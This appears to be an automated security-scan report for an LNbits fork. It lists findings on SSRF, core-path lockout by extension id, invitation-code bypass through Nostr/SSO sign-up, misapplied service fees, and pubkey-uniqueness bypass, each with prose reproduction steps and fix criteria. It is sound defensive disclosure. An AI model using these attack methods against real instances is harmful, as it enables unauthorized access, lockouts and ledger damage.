fetch_release_details() follows the author-supplied description_md URL (and, for explicit releases, an arbitrary details_link) with no destination restriction and returns the body, through an endpoint that requires no authentication. Fix criteria: Apply the same destination policy already used for other author-derived URLs: only https to an allowlist of trusted public hosts (the details_link's own origin / raw.githubusercontent.com), rejecting loopback, private and link-local addresses after resolution, with a timeout and a body size limit; and gate the details endpoint behind at least an authenticated account like its siblings. Verify that a config.json whose description_md points at 127.0.0.1, a LAN address or 169.254.169.254 yields an error and no outbound request, while a raw.githubusercontent.com markdown URL still renders.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Server-side request forgery
**CWE:** [CWE-918](https://cwe.mitre.org/data/definitions/918.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** LOW
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257403

---

# WASM extension with id 'api' (or another core path prefix) locks every user, admin and super user out of that core path

## Details
Per-user extension access control is keyed on the first URL segment. `_extension_id_from_request_path()` (lnbits/decorators.py:529-535) returns `segments[0]` for every path that is not `/ext/...` or `/api/v1/ext/...`; `_check_user_access()` (:511-514) runs on every authenticated dependency (`check_account_exists`, `check_account_id_exists`, `check_user_exists`, `KeyChecker`, `LightKeyChecker`, hence `check_admin`/`check_super_user`) and `check_user_extension_access()` (:489-508) rejects the request with 403 when that segment is in `settings.lnbits_installed_extensions_ids` and the user has not enabled that extension.

Nothing reserves the core top-level segments in the extension-id namespace. A WASM extension id is taken from the manifest's explicit-release `id` (models/extensions.py:35-36, 861-870) and must only match `^[A-Za-z0-9_-]+$` and equal the archive's config.json `id` (wasm/config.py:18, 123-139) — both chosen by the extension author. `install_extension()` (services/extensions.py:190-240) performs no reservation check; `activate_extension()` → `register_wasm_extension()` (wasm_ext/routes/register.py:36) calls `settings.activate_extension_paths(ext_id, [])` (settings.py:238-248), which adds the raw id to `lnbits_installed_extensions_ids`; at every restart `build_all_installed_extensions_list()` (app.py:319-320) re-seeds the set from the `installed_extensions` DB rows.

An extension author who gets an entry with `id: "api"` into a WASM manifest the instance consults (the admin-added manifests in `lnbits_wasm_extensions_manifests`, or the default registry) and whose archive config.json declares `"id": "api"` passes installation when the admin installs it from the extensions page (static/js/pages/extensions.js:205-206 posts `ext_id: selectedExtension.id`). From that moment every authenticated request to `/api/v1/*` resolves to extension id `api`, which no user has enabled (enablement itself is `PUT /api/v1/extension/api/enable`, now blocked), so `_check_user_access()` raises 403 'Extension api not enabled' for every user, admin and the super user, and for every wallet-key caller. The endpoints that could undo it — `PUT /api/v1/extension/{id}/deactivate` (extension_api.py:663), `DELETE /api/v1/extension/{id}` (:682) — are themselves under `/api/v1/` and blocked; the CLI's `--url` mode (commands.py:768-783) calls the same HTTP endpoint with a bearer token and is blocked too. Recovery requires stopping the server and running the CLI offline, setting `LNBITS_EXTENSIONS_DEACTIVATE_ALL`, or editing the DB. If the extension later fails to register at startup, `deactivate_extension()` adds `api` to `lnbits_deactivated_extensions` and `InstalledExtensionMiddleware` (middleware.py:42-47) 404s the whole `/api/` prefix including login and health. Ids `wallet`, `admin`, `account`, `node`, `extensions` deny the corresponding core pages the same way.

The WASM module itself can be benign; the lockout comes from the id alone, so it is not bounded by the WASM permission model. For Python extensions the same collision exists but their authors already run trusted in-process code, so the WASM path is the one that crosses a boundary.

## Evidence
1. [lnbits/settings.py:238–248](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L238-L248)
   activate_extension_paths() adds the raw extension id to lnbits_installed_extensions_ids with no reservation against core route prefixes; called by register_wasm_extension() (wasm_ext/routes/register.py:36) on activation and by register_ext_routes() (app.py:534); build_all_installed_extensions_list() (app.py:319-320) re-seeds the set from DB rows at every start, so the state persists.
2. [lnbits/decorators.py:529–535](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/decorators.py#L529-L535)
   _extension_id_from_request_path() returns the FIRST path segment for any path not under /ext/ or /api/v1/ext/: '/api/v1/wallet' → 'api', '/wallet' → 'wallet', '/admin' → 'admin'.
3. [lnbits/decorators.py:489–526](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/decorators.py#L489-L526)
   check_user_extension_access(): if that segment is an installed extension id the caller must have personally enabled it, else 403. _check_user_access() is invoked by every authenticated dependency (KeyChecker :140, LightKeyChecker :165/:176, check_account_id_exists :287, _check_account_exists :350, hence check_admin/check_super_user), so admins and the super user are locked out too.
4. [lnbits/core/wasm\_ext/wasm/config.py:18](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/wasm_ext/wasm/config.py#L18)
   WASM extension ids are validated only by ^[A-Za-z0-9_-]+$ (enforced at :126); 'api', 'wallet', 'admin', 'account', 'node' all pass. validate_wasm_extension_config_id (:123-139) only requires config.json id == install id, both author-chosen.
5. [lnbits/core/services/extensions.py:190–240](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/extensions.py#L190-L240)
   install_extension() downloads, validates (python-file ban, manifest type) and extracts the archive and creates the installed_extensions row without checking the id against core URL namespace; activate_extension() (:645-654) then registers routes and calls activate_extension_paths via register_wasm_extension.
6. [lnbits/core/models/extensions.py:35–36](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/extensions.py#L35-L36)
   ExplicitRelease.id is a free string from the manifest JSON (fetched from lnbits_wasm_extensions_manifests URLs); InstallableExtension.from_explicit_release (:861-870) copies it as the extension id, and the extensions page posts it back as ext_id on install (static/js/pages/extensions.js:205-206).
7. [lnbits/core/views/extension\_api.py:663–699](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/extension_api.py#L663-L699)
   The remedies — PUT /api/v1/extension/{ext_id}/deactivate (:663) and DELETE /api/v1/extension/{ext_id} (:682), and PUT .../enable (:324) — depend on check_admin/check_account_id_exists, so once 'api' is an installed extension id they return 403 themselves; the CLI --url mode (commands.py:768-783) calls the same endpoint.
8. [lnbits/middleware.py:38–47](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/middleware.py#L38-L47)
   InstalledExtensionMiddleware 404s any request whose first segment is in lnbits_deactivated_extensions; if the colliding extension is ever deactivated (e.g. startup registration failure → deactivate_extension), the entire core prefix is 404 for anonymous traffic too, including login.

## Impact
Persistent denial of the whole authenticated JSON API (payments, wallets, admin, extension management, wallet-key callers) for every user including admins and the super user, surviving restarts because the id is re-seeded from the DB; the HTTP and CLI --url remedies are blocked by the same check, so recovery needs shell access to stop the server or set LNBITS_EXTENSIONS_DEACTIVATE_ALL. No data is read or altered.

## Reproduction steps
1. The attacker is a WASM extension author with no LNbits privileges. Their explicit-release entry with id 'api' must be present in a manifest the instance consults — an admin-added manifest URL or a merged registry entry (AT:P) — and the admin must install it through the normal UI flow (UI:A). The archive need only carry a config.json with the same id and no Python files; the module can be benign. Everything then follows from the id: no sandbox permission, no further interaction and no special deployment configuration is required.

## Recommended fix
1. Extension ids from manifests/archives are admitted into lnbits_installed_extensions_ids (install_extension, activate_extension_paths, build_all_installed_extensions_list) without being checked against the core URL namespace. Fix criteria: Installation and activation must reject extension ids equal to any core top-level route segment or mount (api, ext, ext-assets, ext-frame, static, library, wallet, admin, account, node, extensions, first_install, .well-known, etc.), and an existing installed_extensions row with such an id must not be able to populate the access-check set; verify that installing a WASM extension with id 'api' is refused with a clear error and that core routes stay reachable.
2. _extension_id_from_request_path() treats the first segment of any path as an extension id, so core routes are gated on extension enablement whenever an id collides. Fix criteria: Derive the extension id only for paths that are actually extension mounts (known extension prefixes or ids registered as Python-extension root mounts), never for core prefixes; verify that /api/v1/... and core pages are never gated on an extension named 'api', 'wallet' or 'admin'.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Duplicate resource identifier
**CWE:** [CWE-694](https://cwe.mitre.org/data/definitions/694.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257400

---

# Nostr and SSO sign-up bypass the invitation-code activation requirement

## Details
When an operator sets `lnbits_require_user_activation=True` with `lnbits_user_activation_by_invitation_code=True`, the admin UI tells them that new users will be activated only after passing a confirmation method and must present a valid invitation code during registration. That gate is implemented solely inside `POST /api/v1/auth/register` (`await check_register_activation_settings(data)`, services/users.py:217). The two login-based sign-up paths skip it: `POST /api/v1/auth/nostr` (`nostr_login`, auth_api.py:166) creates an account for any unknown pubkey carried in a validly signed NIP-98 event, and the SSO callback (`_handle_sso_login`, auth_api.py:681) creates an account for any IdP identity whose email has no account yet. Both construct `Account(...)` with the model default `activated=True` (models/users.py:184) and hand it to `create_user_account`, which checks only `new_accounts_allowed` and the global user limit (services/users.py:43), then immediately issue a session via `_login_response`.

An anonymous attacker on an invitation-only instance that also offers Nostr login generates a fresh keypair, signs a kind-27235 event with `method=POST` and `u=<configured nostr_absolute_request_url>/nostr` (the same URL the shipped login button uses), and obtains a fully activated account, wallet and JWT session with no invitation code. With Google/GitHub/Keycloak/OIDC login enabled, anyone holding an account at that IdP does the same via the OAuth callback. The invitation policy is therefore only as strong as the weakest enabled auth method, although the admin UI presents the two as independent settings. Unlike the legacy `POST /api/v1/account` path (which returns only wallet keys and gives no session unless user-id-only login is also enabled), these paths yield a full logged-in user with the whole UI/extension surface.

The email- and payment-based activation variants are not implemented (`check_register_activation_settings` raises 'No activation method provided.'), so the invitation-code path is the only one that exists to be bypassed. Reachable only when the operator has enabled Nostr or SSO login (off by default; `.env.example` AUTH_ALLOWED_METHODS="username-password") and turned on activation by invitation code. The same omission in `/lnurlwallet` and `POST /api/v1/account` is tracked separately; the root cause common to all is that the gate lives in one handler rather than in the shared account-creation service.

## Evidence
1. [lnbits/core/views/auth\_api.py:166–181](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/auth_api.py#L166-L181)
   Unauthenticated POST /api/v1/auth/nostr: after NIP-98 signature/time/tag checks on an attacker-signed event, an unknown pubkey yields Account(id, pubkey, extra) with the model default activated=True, passed straight to create_user_account and then _login_response; check_register_activation_settings is never consulted.
2. [lnbits/core/views/auth\_api.py:681–685](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/auth_api.py#L681-L685)
   _handle_sso_login (reached from the unauthenticated /api/v1/auth/{provider}/token callback) creates an activated Account for any IdP email with no account on file and logs it in, again without the activation gate.
3. [lnbits/core/views/auth\_api.py:482–490](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/auth_api.py#L482-L490)
   Only the username/password register handler calls check_register_activation_settings(data) before create_user_account; this is the sole call site of the gate.
4. [lnbits/core/services/users.py:217–235](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/users.py#L217-L235)
   check_register_activation_settings is the only implementation of lnbits_require_user_activation / lnbits_user_activation_by_invitation_code (reusable and one-time codes); it takes RegisterUser and is reachable only from register.
5. [lnbits/core/services/users.py:43–49](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/users.py#L43-L49)
   create_user_account, the shared service all sign-up paths use, checks only settings.new_accounts_allowed (allow_new_accounts and empty allowed_users) plus the user limit; it does not consult the activation settings.
6. [lnbits/core/models/users.py:184](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/users.py#L184)
   Account.activated defaults to True, so any Account constructed without setting it (as nostr_login and _handle_sso_login do) is persisted as activated.
7. [lnbits/settings.py:58–65](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L58-L65)
   The activation settings are generic account-creation policy under UsersSettings, not scoped to the password method; the admin UI text (static/i18n/en.js require_user_activation_desc, templates/components/admin/users.vue) tells operators 'New users will be activated only after they pass one of the confirmation methods'.

## Impact
Grants an uninvited party an activated account, wallet and session on an instance the operator restricted to invitation holders, i.e. the full ordinary-user surface the policy was meant to withhold — a low integrity impact on the operator's access-control policy. No other user's data or funds are reached; no availability impact.

## Reproduction steps
1. Anonymous network attacker; needs only a self-generated Nostr keypair (or an account at the configured IdP) and the instance's public URL, which the shipped login button reveals as the NIP-98 'u' tag. Requires the non-default combination of activation-by-invitation enabled plus Nostr or SSO login enabled (AT:P). No victim interaction; no privileges.

## Recommended fix
The activation/invitation requirement is enforced only in the username/password register handler instead of at the shared account-creation service, so the Nostr and SSO sign-up paths create activated accounts without it. Fix criteria: Every self-service account-creation path must honour lnbits_require_user_activation uniformly: when it is on, a first-time Nostr login or SSO login must either be refused (or require the invitation code) or create the account with activated=False so it cannot log in or use wallet keys until an admin activates it. Verify that, with activation-by-invitation enabled and nostr-auth-nip98 / an SSO provider allowed, a fresh keypair or new IdP identity does not obtain an activated session.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Authorization bypass
**CWE:** [CWE-424](https://cwe.mitre.org/data/definitions/424.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257397

---

# Service fee deducted from incoming Lightning invoices settled via the pending-payment path and credited to no wallet

## Details
When an operator enables the Lightning service fee (`lnbits_service_fee` > 0 and `lnbits_service_fee_wallet` set), `update_payment_success_status` (lnbits/core/services/payments.py:1050-1052) computes `service_fee(payment.amount, internal=False)` and persists `fee = -(backend_fee + service_fee)` on whatever payment it is given, while the compensating credit to the fee wallet (`_credit_service_fee_wallet`, 1056-1057) is made only `if payment.is_out`. The function is written for outgoing payments, but `update_pending_payment` (422-439) is direction-agnostic and hands pending *incoming* invoices to it once `funding_source.get_invoice_status` reports them paid.

`update_pending_payment` is reached from the unauthenticated `GET /api/v1/payments/{payment_hash}` status endpoint (lnbits/core/views/payment_api.py:429-470, no X-Api-Key needed), from `GET /api/v1/payments/paginated?recheck_pending=true`, and from the scheduled `check_pending_payments` task (441-486). The funding-source stream path that normally settles incoming invoices (`update_invoice_from_paid_invoices_stream`, 1309-1334) stores only `status.fee_msat or payment.fee` — no service fee. Whichever observer commits first decides the receiver's credit: if the pending path commits before the stream handler reads the row, the incoming row is stored with `fee = -service_fee`, the stream handler later keeps that value (`fee_msat` is None for incoming invoices on LND/CLN), and the `balances` view (`SUM(amount - ABS(fee))`, migrations.py:945-947) credits the receiver `amount - service_fee`. Because no fee-wallet row is created for incoming payments, the deducted sats are credited to no LNbits wallet at all: the operator's node holds the full amount but the user ledger sums to less.

On funding sources whose `paid_invoices_stream` is never fed (AlbyWallet, LNPayWallet, OpenNodeWallet, ZBDWallet await a queue nothing in the repository writes to), the pending path is the only settlement path, so every incoming invoice is shorted deterministically. On streaming backends it is a race the payer can drive: pay the invoice and poll `GET /api/v1/payments/{hash}` at high rate (the shipped UI's check button and third-party payment pages poll the same endpoint), and the periodic task applies the same deduction to any paid invoice the stream missed. The admin UI documents the fee as applying to 'outgoing transactions' (en.js:945), and the project's own test for this case (tests/unit/test_pay_invoice.py:1160-1177) asserts only that the fee wallet is not credited, never the receiver's fee, so the defect is unexercised.

Related (not the same defect): fiat-settlement-via-status-poll-overwrites-service-fee describes check_payment_status (710-724) letting the fiat fee be overwritten with 0 on the same pending path; this finding is the Lightning-side inverse rooted in update_payment_success_status applying the outgoing fee to incoming rows.

## Evidence
1. [lnbits/core/services/payments.py:1050–1057](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L1050-L1057)
   update_payment_success_status computes service_fee(payment.amount, internal=False) and persists fee = -(abs(status.fee_msat or 0) + abs(service_fee_msat)) for any payment regardless of direction (1050-1052), but calls _credit_service_fee_wallet only `if payment.is_out` (1056-1057). For an incoming invoice the receiver's row carries a negative fee with no counter-entry anywhere. This is the code the fix must change.
2. [lnbits/core/services/payments.py:422–439](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L422-L439)
   update_pending_payment is direction-agnostic: for a pending incoming invoice it calls check_payment_status (funding_source.get_invoice_status) and on success hands the incoming payment to update_payment_success_status.
3. [lnbits/core/views/payment\_api.py:429–470](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/payment_api.py#L429-L470)
   GET /api/v1/payments/{payment_hash} requires no key (x_api_key optional, wallet may be None) and for any pending payment calls update_pending_payment (454), so the anonymous payer of an invoice can drive the fee-charging settlement of the receiver's invoice the instant the node reports it paid.
4. [lnbits/core/services/payments.py:1309–1334](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L1309-L1334)
   The funding-source stream path (update_invoice_from_paid_invoices_stream) settles the same incoming invoice with `payment.fee = status.fee_msat or payment.fee` — backend fee only, no service fee. If it runs after the poll path has committed, it reads the stored -service_fee and keeps it; the receiver's credit therefore depends on which observer commits first.
5. [lnbits/core/services/payments.py:441–486](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L441-L486)
   check_pending_payments (scheduled every lnbits_funding_source_pending_interval_seconds, default 1800 s) runs update_pending_payment on every pending, non-expired, checkable payment of the last 15 days, incoming invoices included, so any paid invoice the stream missed is settled with the service fee deducted and no attacker involved.
6. [lnbits/core/migrations.py:945–951](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/migrations.py#L945-L951)
   The balances view credits SUM(amount - ABS(fee)) for successful incoming rows, so the negative fee stored on the incoming row directly reduces the receiver's spendable balance by the service-fee amount.
7. [lnbits/wallets/alby.py:210–214](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/alby.py#L210-L214)
   AlbyWallet.paid_invoices_stream (likewise lnpay.py:161-166, opennode.py:166-171, zbd.py:207-212) awaits a queue that no code in the repository ever puts into, so on these funding sources the stream never settles anything and update_pending_payment is the only path that settles incoming invoices: with a service fee configured every incoming invoice is shorted deterministically, no race required.
8. [lnbits/static/i18n/en.js:945](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/static/i18n/en.js#L945)
   The admin UI (templates/components/admin/server.vue:447 renders service_fees_desc) describes the feature as 'Charge a percentage fee on outgoing transactions', and the stream path and _credit_service_fee_wallet implement exactly that, establishing that incoming invoices are not meant to be charged.
9. [tests/unit/test\_pay\_invoice.py:1160–1177](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/tests/unit/test_pay_invoice.py#L1160-L1177)
   test_service_fee_incoming_success_does_not_credit settles an incoming invoice through update_pending_payment with a 1% fee configured and asserts only that the fee wallet receives nothing; it never asserts the receiver's persisted fee or balance, so the shortfall on the receiver's row is unexercised by the test suite.

## Impact
Integrity of the apipayments ledger and of other users' balances: a receiving user is credited amount minus the configured service-fee percentage (capped by lnbits_service_fee_max) for funds the node actually received in full, and the difference is credited to no wallet, so user balances no longer sum to funds received. Bounded per payment by the operator's configured percentage/cap; the attacker gains no funds (griefing of the receiver, unaccounted surplus on the operator's node). No confidentiality or availability effect.

## Reproduction steps
1. Attacker: any anonymous party who pays an LNbits user's invoice (public payment pages, lightning addresses, LNURL) and polls the unauthenticated GET /api/v1/payments/{payment_hash}. Preconditions (AT:PRESENT): the operator has enabled the service fee (lnbits_service_fee > 0 with a fee wallet), and on streaming funding sources the poll must commit before the stream handler reads the row — a race the attacker controls the rate of and can repeat per payment; on Alby/LNPay/OpenNode/ZBD the pending path is the sole settlement path and no race is needed. The scheduled check_pending_payments task produces the same deduction without an attacker whenever the stream misses a paid invoice. No credentials or user interaction required.

## Recommended fix
update_payment_success_status applies the outgoing service fee to every payment it settles regardless of direction, while the compensating fee-wallet credit is made only for outgoing payments, so incoming invoices settled through update_pending_payment carry a fee with no counter-entry. Fix criteria: An incoming invoice settled through any observer (funding-source stream, GET /api/v1/payments/{hash}, recheck_pending, check_pending_payments) ends with the same persisted fee — the backend-reported fee only — and the receiver is credited amount minus that backend fee; or, if incoming fees are intended, they are applied and credited to the fee wallet identically on every path. Verify with a test that settles a fee-configured incoming invoice via update_pending_payment and asserts the receiver's persisted fee and balance, and that the sum of all wallet balances equals funds received.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Incorrect calculation
**CWE:** [CWE-682](https://cwe.mitre.org/data/definitions/682.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257394

---

# Pubkey uniqueness check bypassed with npub form; duplicate pubkeys confuse Nostr login

## Details
`PUT /api/v1/auth/pubkey` (lnbits/core/views/auth_api.py:494-514) is meant to refuse a Nostr public key already attached to another account: `if data.pubkey and data.pubkey != account.pubkey and await get_account_by_pubkey(data.pubkey): raise ValueError('Public key already in use.')`. The check validates the *raw* input, but the value persisted is `normalize_public_key(data.pubkey)` — validate-before-canonicalize. Every writer stores hex (nostr_login stores `event['pubkey']`, the admin user API normalises before its check), so when a user submits another account's key as bech32 `npub1...` (63 chars, within the model's `max_length=64`), `get_account_by_pubkey('npub1...')` compares `LOWER(pubkey) = 'npub1...'` against hex rows and returns nothing. The handler then stores the decoded hex through the crud `update_account`, bypassing `update_user_account`/`validate_fields` and the service-layer duplicate check (services/users.py:134-137). There is no unique constraint on `accounts.pubkey` (migrations m022/m042 create only a plain index). Result: two accounts share one Nostr pubkey.

Consequence when the `nostr-auth-nip98` login method is enabled (not in the default `auth_allowed_methods`, but a documented first-class login method the threat model lists as an anonymous surface): `nostr_login` (auth_api.py:166-182) resolves `get_account_by_pubkey(event['pubkey'], active_only=False)` with `fetchone` and no ORDER BY. On SQLite the `LOWER(pubkey)` expression defeats `idx_accounts_pubkey`, so the query is a full table scan in rowid order and the older account wins; on Postgres heap order applies. If the attacker's account precedes the victim's, the victim's correctly signed NIP-98 login lands in the attacker's account: the victim sees the attacker's wallets as their own, invoices they issue and funds they deposit go to a wallet whose owner holds the account password, and the attacker observes that activity. The victim is also denied Nostr login to their real account (a total lockout if that account was Nostr-only, `provider='nostr'`). The attacker cannot sign for the victim's key, so the attack is ordering-dependent, but an attacker who registers early (or holds several old accounts) can later claim the pubkey of any user who joined afterwards; on Postgres the updated tuple's placement is not under the attacker's control.

This bypasses an explicit shipped control: the project otherwise concedes only that whoever first links an *unused* pubkey owns it; here the attacker claims a pubkey already linked to an existing account. `api_create_user`/`api_update_user` (admin) are unaffected because they normalise before the lookup.

## Evidence
1. [lnbits/core/views/auth\_api.py:494–513](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/auth_api.py#L494-L513)
   update_pubkey runs the uniqueness lookup get_account_by_pubkey(data.pubkey) on the raw submitted string, then persists normalize_public_key(data.pubkey) (canonical hex) via the crud update_account, which skips update_user_account/validate_fields. For an npub1... input the lookup compares a bech32 string against stored hex values and finds nothing, so the 'Public key already in use.' guard is bypassed and a hex pubkey already held by another account is stored a second time.
2. [lnbits/core/crud/users.py:201–212](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/crud/users.py#L201-L212)
   get_account_by_pubkey matches LOWER(pubkey) = :pubkey literally, with no ORDER BY, and returns the first row (fetchone -> result.mappings().first()). An npub never equals a stored hex value; with duplicates the row returned depends on scan order.
3. [lnbits/core/views/auth\_api.py:166–181](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/auth_api.py#L166-L181)
   nostr_login resolves the signer by get_account_by_pubkey(event['pubkey'], active_only=False) and issues a session for whichever duplicate row comes first; with the attacker's row first, the victim's validly signed NIP-98 event logs the victim into the attacker's account.
4. [lnbits/core/models/users.py:351–353](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/users.py#L351-L353)
   UpdateUserPubkey.pubkey has max_length=64, which admits the 63-character npub1... encoding of a 32-byte key, so the bech32 form reaches the handler.
5. [lnbits/utils/nostr.py:170–191](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/utils/nostr.py#L170-L191)
   normalize_public_key/normalize_bech32_key decode npub1... (bech32 1.2.x bech32_decode + convertbits 5->8) to lowercase hex and otherwise require 64 hex chars; this canonicalisation runs only after the uniqueness check, producing the stored value that collides with the victim's.
6. [lnbits/core/migrations.py:775–788](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/migrations.py#L775-L788)
   m042 creates only a plain (non-unique) index on accounts.pubkey, and m022 added the column without a constraint, so the database does not enforce the invariant the handler fails to check.
7. [tests/api/test\_auth.py:1064–1101](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/tests/api/test_auth.py#L1064-L1101)
   test_change_pubkey_npub_ok confirms that npub input is accepted by PUT /api/v1/auth/pubkey and persisted as hex; no test covers uniqueness across the two encodings.

## Impact
Victim is transparently logged into an attacker-controlled account: funds the victim deposits or invoices they issue belong to the attacker, who also observes the victim's activity in that account. The victim loses Nostr access to their real account (complete lockout for Nostr-only accounts). The victim's existing account data and balance are not read or altered.

## Reproduction steps
1. Attacker: any self-registered user who knows a victim's Nostr pubkey (public by nature) and holds an account row that sorts before the victim's (on SQLite: created earlier, since the LOWER(pubkey) scan is in rowid order). One authenticated PUT within the 120 s post-login window (_validate_auth_timeout) plants the duplicate. The login confusion then requires the operator to have enabled nostr-auth-nip98 and the victim to perform a routine Nostr login. Depends on bech32~=1.2.0 decoding a 63-char npub to 32 bytes (assumed from the pinned package's documented API).

## Recommended fix
1. The duplicate-pubkey check runs on the raw input while the persisted value is canonicalised afterwards, so choosing the npub encoding evades the check (validate before canonicalize). Fix criteria: Canonicalise the submitted key to lowercase hex before any lookup, route the update through the same validation path as other account updates (update_user_account), and back the invariant with a unique index on accounts.pubkey. Verify: submitting another account's pubkey as npub1... is rejected with 'Public key already in use.' and the database refuses a duplicate hex pubkey.
2. Authentication lookups by pubkey silently return the first row when duplicates exist, turning a data-integrity bug into a login confusion. Fix criteria: Account lookups used for authentication fail closed when more than one row matches. Verify: with two accounts sharing a pubkey, Nostr login is refused rather than resolving to an arbitrary account.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Encoding confusion
**CWE:** [CWE-180](https://cwe.mitre.org/data/definitions/180.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257392

---

